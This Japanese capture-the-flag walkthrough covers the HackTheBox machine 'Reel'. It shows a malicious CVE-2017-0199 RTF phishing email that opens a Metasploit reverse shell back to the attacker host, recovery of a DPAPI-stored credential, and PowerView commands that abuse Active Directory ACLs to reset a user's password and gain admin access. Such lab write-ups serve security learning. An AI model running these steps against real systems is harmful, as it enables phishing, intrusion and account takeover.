---
title: "[Hard] Reel HackTheBox"
emoji: "🎬"
type: "tech"
topics: ["hackthebox", "pentesting", "activedirectory"]
published: true
---

# TL;DR

- 匿名FTPで公開されていた手順書とWord文書のメタデータから、変換担当者`nico@megabank.com`のメールアドレスを特定しました
- CVE-2017-0199を悪用したRTFファイルをメールで送信し、Nico権限での初期シェルを取得しました
- Nicoのデスクトップにあった`cred.xml`をNico自身のセッションで復号し、Tomのパスワードを取得しました
- `acls.csv`の手動確認により、TomがClaireに対して`WriteOwner`を持つことを発見し、Claireのパスワードを強制リセットしました
- ClaireがBackup_Adminsグループに対して`WriteDacl`を持つことを利用し、自身をグループに追加しました
- `icacls`でBackup_AdminsがAdministratorのDesktopにフルコントロールを持つことを確認し、Backup Scripts内の平文パスワードからAdministrator権限を取得しました

---

# 🔎 Enumeration

## nmap

nmapによるポートスキャンを実施しました。FTPで匿名ログインが許可されており、SMTPサーバも動作していることが確認できました。

```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
```

## ftp anonymous login

匿名でFTPログインすると、テキストファイル1つとWordファイル2つが公開されていたため、すべてダウンロードしました。

```
$ ftp anonymous@10.129.163.133
Connected to 10.129.163.133.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41012|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
```

`readme.txt`には、RTF形式で手順書をメール送信するとレビュー・変換してくれるという運用が書かれていました。

```
$ cat readme.txt
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

つまり、RTFファイルをメールに添付すると、担当者側でdocに変換してくれるということです。exiftoolですでに変換済みと推測されるWordファイルを確認すると、変換担当者のメールアドレスが取得できました（`nico@megabank.com`）。

```
======== Windows Event Forwarding.docx
ExifTool Version Number         : 12.76
File Name                       : Windows Event Forwarding.docx
File Type                       : DOCX
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Creator                         : nico@megabank.com
[SNIP]
```

# ⚒️ Exploit -user flag-

## CVE-2017-0199

調査したところ、CVE-2017-0199が該当しそうだと分かりました。metasploitの`exploit/windows/fileformat/office_word_hta`モジュールを使用します。

```
msf exploit(windows/fileformat/office_word_hta) > show options

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  dash.rtf         yes       The file name.
   SRVHOST   10.10.15.141     yes       The local host or network interface to listen on.
   SRVPORT   8080             yes       The local port to listen on.
   URIPATH   default.hta      yes       The URI to use for the HTA file

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST     10.10.15.141     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

swaksコマンドで、生成した悪性RTFファイルをNico宛にメール送信します。

```
$  swaks --server 10.129.8.192 \
    --from dash@megabank.com \
    --to nico@megabank.com \
    --header "Subject: RTF File Attachment" \
    --body "Hello, please check the attached file." \
    --attach-type application/rtf \
    --attach @/home/dash/.msf4/local/dash.rtf
```

しばらく待つと、Nico権限でのリバースシェルが返ってきました。

```
msf exploit(windows/fileformat/office_word_hta) >
[*] Started reverse TCP handler on 10.10.15.141:4444
[+] dash.rtf stored at /home/dash/.msf4/local/dash.rtf
[*] Using URL: http://10.10.15.141:8080/default.hta
[*] Server started.
[*] Sending stage (199238 bytes) to 10.129.8.192
[*] Meterpreter session 1 opened (10.10.15.141:4444 -> 10.129.8.192:50264)

meterpreter > getuid
Server username: HTB\nico
meterpreter > ls
Listing: C:\Users\nico\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  1468  fil   2017-10-27 23:59:16 +0000  cred.xml
100444/r--r--r--  34    fil   2026-07-19 06:10:53 +0000  user.txt
```

Nicoの権限を取得し、ユーザフラグをゲットしました。

# 🔎 Enumeration (Internal)

## PEAS

winPEASなどを実行しようとしましたが、グループポリシーでブロックされ実行できませんでした。

```
C:\Users\nico\Downloads>winPEASx64.exe
winPEASx64.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

## dir walk

`C:\Users`配下を確認すると、複数のユーザが存在することが分かりました。

```
meterpreter > ls ../../
Listing: ../../
===============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2018-02-16 23:29:41 +0000  Administrator
040777/rwxrwxrwx  4096  dir   2017-11-04 23:05:47 +0000  brad
040777/rwxrwxrwx  4096  dir   2017-10-30 23:00:21 +0000  claire
040777/rwxrwxrwx  4096  dir   2017-11-03 23:09:55 +0000  herman
040777/rwxrwxrwx  4096  dir   2017-10-31 22:27:35 +0000  julia
040777/rwxrwxrwx  8192  dir   2018-05-29 22:37:17 +0000  nico
040777/rwxrwxrwx  4096  dir   2017-11-16 22:35:29 +0000  tom
```

Nicoのデスクトップにあった`cred.xml`を確認します。DPAPIで保護された資格情報は先頭が固定文字列`01000000d08c9ddf0115d1118c7a00c04fc297eb`になります。

```
$ cat cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb...</SS>
    </Props>
  </Obj>
</Objs>
```

DPAPIで保護された資格情報は、これを作成したユーザのセッションでのみ復号できます。攻撃端末で無理に復号を試みるのではなく、Nicoのセッション上で`Import-Clixml`を実行し、Tomのパスワードを復号しました。

```
C:\Users\nico\Desktop>powershell -c "$cred = Import-Clixml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential().Password"
1ts-mag1c!!!
```

復号したパスワードでSSHログインに成功しました。

```
tom@REEL C:\Users\tom>whoami
htb\tom
```

# 👻 Exploit -root flag-

## nico to tom to claire

Tomのデスクトップに、AD監査用の資料が残っていました。BloodHoundの実行メモが置かれており、machine作成者からのヒントとも考えられます。

```
tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt
Findings:

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).

Maybe we should re-run Cypher query against other groups we've created.
```

BloodHound.exeやBloodHound.ps1は実行できませんでしたが、収集済みの`acls.csv`が残っていたため、これを手動で解析しました。CSVはAD ACLの証拠でしかないため、ファイルシステム権限とは区別して確認する必要があります。解析すると、TomがClaireユーザに対して`WriteOwner`を持っていることが分かりました。

```
"ObjectName","ObjectType","ObjectGuid","PrincipalName","PrincipalType","ActiveDirectoryRights","ACEType","AccessControlType","IsInherited"
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
```

既にサーバ上にあったPowerViewスクリプトを利用し、Claireオブジェクトの所有者をTomへ変更、自身にフルコントロールのACEを追加した上でパスワードを強制リセットしました。元のパスワードを知らなくても実行できます。

```
PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1

# 1. claireオブジェクトの所有者をtomに変更
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom

# 2. 所有者になったので、自分(tom)にFullControlのACEを追加
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All

# 3. claireのパスワードを強制リセット(元のパスワードを知らなくてOK)
Set-DomainUserPassword -Identity claire -AccountPassword (ConvertTo-SecureString 'DashPassw0rd'  -AsPlainText -Force)
```

ClaireとしてSSHログインに成功しました。

```
claire@REEL C:\Users\claire>whoami
htb\claire
```

## claire to Backup_Admins

`acls.csv`をさらに確認すると、Claireは`Backup_Admins`グループに対して`WriteDacl`を持っていることが分かりました。

```
"ObjectName","ObjectType","ObjectGuid","PrincipalName","PrincipalType","ActiveDirectoryRights","ACEType","AccessControlType","IsInherited"
"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"
```

PowerViewをClaireから読み込めるように、TomのセッションでAD監査フォルダに最小限の読み取り・実行権限を付与します。

```
PS C:\Users\tom\Desktop\AD Audit\BloodHound> icacls 'C:\Users\tom\Desktop\AD Audit' /grant 'HTB\claire:(OI)(CI)RX' /T /C
Successfully processed 9 files; Failed processing 1 files
```

Claireのセッションから、`Backup_Admins`のDACLに自身への完全制御ACEを追加し、続けて自分をグループメンバーに追加しました。

```
PS C:\Users\claire> .  'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'
PS C:\Users\claire> Add-DomainObjectAcl -TargetIdentity Backup_Admins -PrincipalIdentity claire -Rights All
PS C:\Users\claire> Add-DomainGroupMember -Identity Backup_Admins -Members claire
PS C:\Users\claire> Get-DomainGroupMember -Identity Backup_Admins

GroupDomain             : HTB.LOCAL
GroupName               : Backup_Admins
MemberName              : claire
MemberObjectClass       : user
```

グループ変更を現在のログオントークンへ反映させるため、一度SSHを切断して再接続します。

## Backup_Admins to Administrator

再接続後、`icacls`で実際のファイルシステム権限を確認したところ、`HTB\Backup_Admins`が`C:\Users\Administrator\Desktop`に継承されたフルコントロールを持つことが分かりました。

```
PS C:\Users\claire> icacls 'C:\Users\Administrator\Desktop'
C:\Users\Administrator\Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                               HTB\Backup_Admins:(I)(OI)(CI)(F)
                               HTB\Administrator:(I)(OI)(CI)(F)
                               BUILTIN\Administrators:(I)(OI)(CI)(F)

PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         11/2/2017   9:47 PM            Backup Scripts
-ar--         8/17/2026   7:23 AM         34 root.txt
```

`root.txt`自体は個別のアクセス制御によって読み取りが拒否されましたが、`Backup Scripts`ディレクトリ配下のPowerShellスクリプトは読み取れました。`BackupScript.ps1`にAdministratorの平文パスワードが残っていました。

```
PS C:\Users\Administrator\Desktop\Backup Scripts> cat .\BackupScript.ps1
# admin password
$password="Cr4ckMeIfYouC4n!"
```

取得したパスワードでAdministratorとしてSSHログインし、rootフラグを取得しました。

```
administrator@REEL C:\Users\Administrator>cd Desktop

administrator@REEL C:\Users\Administrator\Desktop>type  root.txt
ad0dc8***************************
```

rootフラグとuserフラグの両方を取得し、Reelマシンの完全な攻略に成功しました。
